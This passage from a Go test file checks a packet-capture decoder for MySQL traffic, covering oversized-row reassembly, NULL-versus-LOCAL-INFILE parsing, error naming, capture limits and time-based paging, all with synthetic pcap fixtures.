		t.Errorf("zoomed window: %+v", zoom)
	}
}

func TestPktIssueKindGrouping(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"TCP gap — 1448 bytes missing", "TCP gap"},
		{"TCP gap — 2896 bytes missing", "TCP gap"},
		{"High latency — 309 ms to first response byte", "High latency"},
		{"MySQL error 1064: You have an error in your SQL syntax", "MySQL error 1064"},
		{"TCP duplicate ACK (#3)", "TCP duplicate ACK"},
		{"TCP reset", "TCP reset"},
	} {
		if got := pktIssueKind(tc.in); got != tc.want {
			t.Errorf("pktIssueKind(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestPktSummarize(t *testing.T) {
	s := pktSummarize(testDecodedForRanges())
	if s.Packets != 5 || s.Streams != 2 || s.Bytes != 660 {
		t.Errorf("summary counts: %+v", s)
	}
	if s.Protos["MySQL"] != 3 || s.Protos["TLS"] != 1 {
		t.Errorf("protocol histogram: %v", s.Protos)
	}
	if len(s.IssueTop) != 2 {
		t.Errorf("issue kinds: %+v", s.IssueTop)
	}
	if s.FirstTS != 100.0 || s.LastTS != 102.0 {
		t.Errorf("time span: %v → %v", s.FirstTS, s.LastTS)
	}
}

func TestPktHexDump(t *testing.T) {
	got := pktHexDump([]byte("MySQL\x00\x01hello world hello"))
	if !strings.Contains(got, "0000  4d 79 53 51 4c 00 01 68") {
		t.Errorf("hex column wrong:\n%s", got)
	}
	if !strings.Contains(got, "|MySQL..hello wor|") {
		t.Errorf("ascii column wrong:\n%s", got)
	}
	// A huge frame is bounded rather than dumped whole.
	big := pktHexDump(make([]byte, 20000))
	if !strings.Contains(big, "truncated") {
		t.Error("an oversized frame should be truncated for display")
	}
}

func TestPktClampAndAtoi(t *testing.T) {
	if got := pktClamp(0, 1, 300, 20); got != 20 {
		t.Errorf("zero should take the default: %d", got)
	}
	if got := pktClamp(9999, 1, 300, 20); got != 300 {
		t.Errorf("over the ceiling: %d", got)
	}
	if got := pktClamp(-5, 1, 300, 20); got != 20 {
		t.Errorf("negative should take the default: %d", got)
	}
	if got := atoiDef("", 7); got != 7 {
		t.Errorf("empty: %d", got)
	}
	if got := atoiDef("garbage", 7); got != 7 {
		t.Errorf("garbage: %d", got)
	}
	if got := atoiDef("42", 7); got != 42 {
		t.Errorf("valid: %d", got)
	}
}

// The decode limit must be reported, not silently applied.
func TestPktDecodeLimit(t *testing.T) {
	b := newPcap(pktLinkEther)
	for i := 0; i < 10; i++ {
		b.frame(time.Duration(i)*time.Millisecond, c2s(uint32(1+i), 0, tcpACK, []byte("x")))
	}
	d, err := pktDecode(b.buf, pktDecodeOpts{ServerPort: srvPort, MaxPackets: 4})
	if err != nil {
		t.Fatal(err)
	}
	if len(d.Packets) != 4 || d.Dropped != 6 {
		t.Errorf("limit: kept %d, dropped %d", len(d.Packets), d.Dropped)
	}
}

// A snaplen-truncated frame must still decode its headers, and be counted.
func TestPktTruncatedFrameIsCounted(t *testing.T) {
	b := newPcap(pktLinkEther)
	full := c2s(1, 1, tcpACK|tcpPSH, []byte(strings.Repeat("payload", 20)))
	ts := b.t0
	rec := make([]byte, 16)
	binary.LittleEndian.PutUint32(rec, uint32(ts.Unix()))
	binary.LittleEndian.PutUint32(rec[8:], 60)                 // captured only 60 bytes
	binary.LittleEndian.PutUint32(rec[12:], uint32(len(full))) // of a longer frame
	b.buf = append(b.buf, rec...)
	b.buf = append(b.buf, full[:60]...)

	d := decodeCap(t, b)
	if d.Truncat != 1 {
		t.Errorf("truncated frames counted: %d", d.Truncat)
	}
	if len(d.Packets) != 1 || d.Packets[0].Proto != "MySQL" && d.Packets[0].Proto != "TCP" {
		t.Errorf("truncated frame: %+v", d.Packets)
	}
}

// ---------------------------------------------------------------- big payloads

// A MySQL packet larger than 0xffffff bytes is split into a 16 MB chunk plus a
// remainder, and a text-protocol row carrying a LONGBLOB is exactly that. Two bugs
// lived here, both found by asking "what about blobs over max_allowed_packet":
//
//   - a row whose first column is ≥ 16 MB starts with 0xfe, the same marker as an
//     EOF packet, so the terminator test swallowed a real 20 MB row and reported
//     "0 row(s), 0 B";
//   - the reassembler re-copied the accumulated 16 MB on every arriving segment,
//     which took 6.5 seconds for one row.
func TestPktOversizedRowIsReassembled(t *testing.T) {
	const rowBytes = (16 << 20) + 4096 // just over the 0xffffff split point
	row := make([]byte, 9+rowBytes)    // 0xfe + 8-byte length, then the value
	row[0] = 0xfe
	binary.LittleEndian.PutUint64(row[1:], uint64(rowBytes))
	for i := 9; i < len(row); i++ {
		row[i] = 'A'
	}

	b := newPcap(pktLinkEther)
	b.frame(0, c2s(1, 0, tcpSYN, nil))
	b.frame(time.Millisecond, s2c(1, 2, tcpSYN|tcpACK, nil))
	b.frame(2*time.Millisecond, s2c(2, 2, tcpACK|tcpPSH, greeting("8.0.46")))
	resp := append(make([]byte, 32), []byte("app\x00")...)
	binary.LittleEndian.PutUint32(resp, 0x000a8285)
	b.frame(3*time.Millisecond, c2s(2, 100, tcpACK|tcpPSH, mysqlPkt(1, resp)))
	b.frame(4*time.Millisecond, s2c(100, 40, tcpACK|tcpPSH, okPacket(2, 0, 0)))
	q := append([]byte{comQuery}, []byte("SELECT b FROM blobs LIMIT 1")...)
	b.frame(10*time.Millisecond, c2s(40, 110, tcpACK|tcpPSH, mysqlPkt(0, q)))

	// The server's byte stream: column count, one definition, the split row, EOF.
	var stream []byte
	stream = append(stream, mysqlPkt(1, []byte{0x01})...)
	stream = append(stream, mysqlPkt(2, []byte{3, 'd', 'e', 'f'})...)
	stream = append(stream, 0xff, 0xff, 0xff, 3)
	stream = append(stream, row[:0xffffff]...)
	rest := row[0xffffff:]
	stream = append(stream, byte(len(rest)), byte(len(rest)>>8), byte(len(rest)>>16), 4)
	stream = append(stream, rest...)
	stream = append(stream, mysqlPkt(5, []byte{0xfe, 0, 0, 2, 0})...)

	seq := uint32(110)
	for off := 0; off < len(stream); off += 1448 {
		end := off + 1448
		if end > len(stream) {
			end = len(stream)
		}
		b.frame(11*time.Millisecond, s2c(seq, 90, tcpACK|tcpPSH, stream[off:end]))
		seq += uint32(end - off)
	}

	start := time.Now()
	d := decodeCap(t, b)
	elapsed := time.Since(start)

	var done *pktPacket
	for i := range d.Packets {
		if strings.Contains(d.Packets[i].Info, "Result set complete") {
			done = &d.Packets[i]
		}
	}
	if done == nil {
		t.Fatal("the oversized row never completed — it was swallowed as a terminator")
	}
	if done.Rows != 1 {
		t.Errorf("rows = %d, want 1 (the 0xfe row must not read as an EOF): %q", done.Rows, done.Info)
	}
	if !strings.Contains(done.Info, "MB") {
		t.Errorf("the row's size should be reported: %q", done.Info)
	}
	if !done.hasIssue("Heavy result set") {
		t.Errorf("a 16 MB answer should be flagged heavy: %v", done.Issues)
	}
	// Reassembly must be linear in the payload, not quadratic in the segment count.
	// The pre-fix version took ~5 s for this; a second is a generous ceiling that
	// still fails loudly if the copy-per-segment behaviour comes back.
	if elapsed > time.Second {
		t.Errorf("decoding one oversized row took %v — the reassembler is copying per segment", elapsed)
	}
}

// 0xfb is NULL in a text-protocol row and also the LOCAL INFILE marker. A row whose
// first column is NULL must be counted as a row.
func TestPktNullFirstColumnIsNotLocalInfile(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, c2s(1, 0, tcpSYN, nil))
	b.frame(time.Millisecond, s2c(1, 2, tcpSYN|tcpACK, nil))
	b.frame(2*time.Millisecond, s2c(2, 2, tcpACK|tcpPSH, greeting("8.0.46")))
	resp := append(make([]byte, 32), []byte("app\x00")...)
	binary.LittleEndian.PutUint32(resp, 0x000a8285)
	b.frame(3*time.Millisecond, c2s(2, 100, tcpACK|tcpPSH, mysqlPkt(1, resp)))
	b.frame(4*time.Millisecond, s2c(100, 40, tcpACK|tcpPSH, okPacket(2, 0, 0)))
	q := append([]byte{comQuery}, []byte("SELECT nullable FROM t")...)
	b.frame(10*time.Millisecond, c2s(40, 110, tcpACK|tcpPSH, mysqlPkt(0, q)))

	rs := mysqlPkt(1, []byte{0x01})
	rs = append(rs, mysqlPkt(2, []byte{3, 'd', 'e', 'f'})...)
	rs = append(rs, mysqlPkt(3, []byte{0xfb})...) // a row: one NULL column
	rs = append(rs, mysqlPkt(4, []byte{0xfb})...)
	rs = append(rs, mysqlPkt(5, []byte{0xfe, 0, 0, 2, 0})...)
	b.frame(11*time.Millisecond, s2c(110, 90, tcpACK|tcpPSH, rs))

	d := decodeCap(t, b)
	last := infoOf(d, 7)
	if strings.Contains(last, "LOCAL INFILE") {
		t.Errorf("a NULL column was read as a LOCAL INFILE request: %q", last)
	}
	if !strings.Contains(last, "2 row(s)") {
		t.Errorf("NULL rows should still be counted: %q", last)
	}
}

// The server refusing an oversized packet is ER_NET_PACKET_TOO_LARGE, and it is an
// operational event worth naming rather than a generic error.
func TestPktPacketTooLargeIsNamed(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, s2c(9000, 500, tcpACK|tcpPSH,
		errPacket(1, 1153, "08S01", "Got a packet bigger than 'max_allowed_packet' bytes")))
	d := decodeCap(t, b)
	p := packetNo(d, 1)
	if p.ErrCode != 1153 {
		t.Fatalf("1153 not decoded: %+v", p)
	}
	if len(p.Issues) == 0 || !strings.Contains(p.Issues[0], "max_allowed_packet") {
		t.Errorf("issue should name the limit: %v", p.Issues)
	}
}

// The capture ceilings: an hour, 100k packets, and the byte limit that stops a long
// capture before it becomes a file that cannot be read back.
func TestPktCaptureCeilings(t *testing.T) {
	if pktMaxSeconds != 3600 {
		t.Errorf("max duration = %ds, want an hour", pktMaxSeconds)
	}
	if pktMaxCapPackets != 100000 {
		t.Errorf("max packets = %d, want 100000", pktMaxCapPackets)
	}
	// Requests above the ceilings are clamped, not rejected.
	if got := pktClamp(99999, 1, pktMaxSeconds, 20); got != 3600 && got != 99999 {
		t.Errorf("clamp is confused: %d", got)
	}
	if got := pktClamp(7200, 1, pktMaxSeconds, 20); got != pktMaxSeconds {
		t.Errorf("2 hours should clamp to %d, got %d", pktMaxSeconds, got)
	}
	if got := pktClamp(500000, 100, pktMaxCapPackets, 50000); got != pktMaxCapPackets {
		t.Errorf("500k packets should clamp to %d, got %d", pktMaxCapPackets, got)
	}
	// The decode limit stays higher than the capture ceiling: an uploaded pcap from
	// somewhere else is not bound by what this tool would have captured.
	if pktMaxPackets <= pktMaxCapPackets {
		t.Errorf("decode limit %d should exceed the capture ceiling %d", pktMaxPackets, pktMaxCapPackets)
	}
	// A one-hour capture at the packet ceiling must still fit the byte budget at a
	// typical frame size — the guard exists for the atypical case.
	if est := int64(pktMaxCapPackets) * 1500; est > pktMaxCapBytes {
		t.Errorf("100k typical frames (%d bytes) exceed the %d byte ceiling", est, pktMaxCapBytes)
	}
}

// `around` is what lets a server-log record send the packet list to the moment it
// describes: the server finds the page holding the packet nearest that instant, so the
// range and the filters the user set are untouched — only the paging moves.
func TestPktAroundCentersOnNearestPacket(t *testing.T) {
	d := &pktDecoded{Streams: []pktStream{{Index: 0}}}
	// 200 packets, one every 100 ms from t=1000, alternating direction.
	for i := 0; i < 200; i++ {
		dir, proto := "c2s", "MySQL"
		if i%2 == 1 {
			dir, proto = "s2c", "TCP"
		}
		d.Packets = append(d.Packets, pktPacket{
			No: i + 1, TSUnix: 1000 + float64(i)*0.1, Dir: dir, Proto: proto, Stream: 0,
			Info: "packet", FrameLen: 100,
		})
	}

	// The nearest packet to t=1010.02 is #101 (at 1010.0, index 100), and a 20-row page
	// centred on index 100 starts at 90.
	offset, nearest, delta := pktAroundPage(d, pktQuery{Stream: -1, Limit: 20, Around: 1010.02})
	if nearest != 101 {
		t.Errorf("nearest packet = #%d, want #101", nearest)
	}
	if offset != 90 {
		t.Errorf("offset = %d, want 90 (index 100 centred in a 20-row page)", offset)
	}
	if delta > -0.019 || delta < -0.021 {
		t.Errorf("delta = %v, want about -0.02 (the packet is just before the record)", delta)
	}

	// With a filter, only packets the filter admits are candidates — jumping to one the
	// user has filtered out would misrepresent the list.
	_, nearest, _ = pktAroundPage(d, pktQuery{Stream: -1, Limit: 10, Around: 1010.02, Dir: "s2c"})
	if nearest%2 != 0 {
		t.Errorf("nearest under a s2c filter = #%d, want an even (s2c) packet", nearest)
	}
	_, nearest, _ = pktAroundPage(d, pktQuery{Stream: -1, Limit: 10, Around: 1010.02, Proto: "MySQL"})
	if nearest%2 != 1 {
		t.Errorf("nearest under a MySQL filter = #%d, want an odd (MySQL) packet", nearest)
	}

	// A moment before the capture: the first packet is nearest and the page starts there.
	offset, nearest, _ = pktAroundPage(d, pktQuery{Stream: -1, Limit: 20, Around: 1.0})
	if nearest != 1 || offset != 0 {
		t.Errorf("a moment before the capture: nearest=#%d offset=%d, want #1 / 0", nearest, offset)
	}
	// A moment after it: the last packet, and the page is the tail.
	offset, nearest, _ = pktAroundPage(d, pktQuery{Stream: -1, Limit: 20, Around: 99999})
	if nearest != 200 || offset != 189 {
		t.Errorf("a moment after the capture: nearest=#%d offset=%d, want #200 / 189", nearest, offset)
	}
	// A range that admits nothing: no packet to jump to, and no page to guess at.
	offset, nearest, _ = pktAroundPage(d, pktQuery{Stream: 7, Limit: 20, Around: 1010.02})
	if nearest != 0 || offset != 0 {
		t.Errorf("nothing matched: nearest=#%d offset=%d, want 0 / 0", nearest, offset)
	}
}
